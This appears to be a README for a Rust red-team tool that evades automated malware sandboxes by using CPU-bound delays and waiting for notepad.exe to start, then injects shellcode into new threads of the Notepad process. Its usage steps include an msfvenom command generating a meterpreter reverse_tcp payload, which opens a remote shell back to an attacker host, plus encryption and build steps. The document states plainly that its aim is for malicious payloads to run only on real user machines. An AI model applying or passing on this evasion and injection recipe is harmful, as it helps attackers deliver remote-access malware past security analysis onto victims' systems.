## **Bypassing Sandbox Detection Test**

As is well known, it is not realistic to achieve delays using the `sleep` function in a sandbox environment. Sandboxes often detect and flag such behavior as suspicious or evasive.

Instead, more effective techniques involve:

- Performing **CPU-intensive calculations**
- Implementing **inefficient algorithms**
- Waiting for **specific instructions in a loop** to bypass detection

These methods simulate legitimate resource consumption and delay execution without triggering common sandbox heuristics.

### **Triggering Execution Based on Notepad Detection**

In many sandbox environments, there is usually **no user interaction or typical desktop activity**, such as opening Notepad (`notepad.exe`). This behavioral difference can be leveraged for evasion.

We utilize this by:

1. Using **Notepad** as a designated indicator of a real user environment
2. Monitoring for the presence of the Notepad process
3. Once detected, executing shellcode through new **threads** within the Notepad process

This technique helps ensure that malicious payloads are only executed in environments that closely resemble real user systems — not in automated sandboxes.

### **Usage Instructions**

#### 1. Generate Shellcode with `msfvenom`

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f rust
```

#### 2. Encrypt the Shellcode by enc/src/main.rs

#### 3. Update the run/src/main.rs shellcode

#### 4. Run cargo build



----------------------------------------------------------------------------------
![1](https://github.com/user-attachments/assets/e77ba48a-fa39-42ed-9198-ba8ae39e1ca3)
![2](https://github.com/user-attachments/assets/2aede2e8-60dc-48d8-a91b-8335446677ec)
![3](https://github.com/user-attachments/assets/337a20b0-1d55-4199-af1a-25d246c77c63)

-----------------------------------------------------------------------------------



<h2>References</h2>
[RustRedOps](https://github.com/joaoviictorti/RustRedOps/tree/main)


  
